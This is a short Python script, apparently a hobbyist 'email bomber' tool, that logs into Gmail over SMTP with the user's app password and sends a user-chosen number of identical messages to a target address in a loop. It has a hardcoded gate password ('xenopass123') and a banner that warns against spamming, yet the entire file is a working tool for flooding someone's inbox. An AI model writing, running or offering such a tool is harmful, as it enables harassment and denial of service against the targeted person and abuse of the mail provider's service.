import smtplib
import getpass
import os

os.system("clear")
print("""\033[1;31m
███████╗███╗   ███╗ █████╗ ██╗██╗     
██╔════╝████╗ ████║██╔══██╗██║██║     
█████╗  ██╔████╔██║███████║██║██║     
██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
    EMAIL BOMBER XENO v1.0

 WARNING: DO NOT USE THIS TOOL FOR SPAMMING 
 PASSWORD PROTECTION ENABLED
-------------------------------------
\033[0m""")

fake_password = getpass.getpass("Enter Tool Password: ")
if fake_password != "xenopass123":
    print("Access Denied: Wrong Password")
    exit()

email = input("Your Gmail: ")
real_password = getpass.getpass("Your App Password: ")
target = input("Target Email: ")
subject = input("Subject: ")
message = input("Message: ")
amount = int(input("How many emails to send: "))

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, real_password)
    for i in range(amount):
        full_message = f"Subject: {subject}\n\n{message}"
        server.sendmail(email, target, full_message)
        print(f"[{i+1}] Sent!")
    server.quit()
    print("All emails sent successfully!")
except Exception as e:
    print("Error:", e)
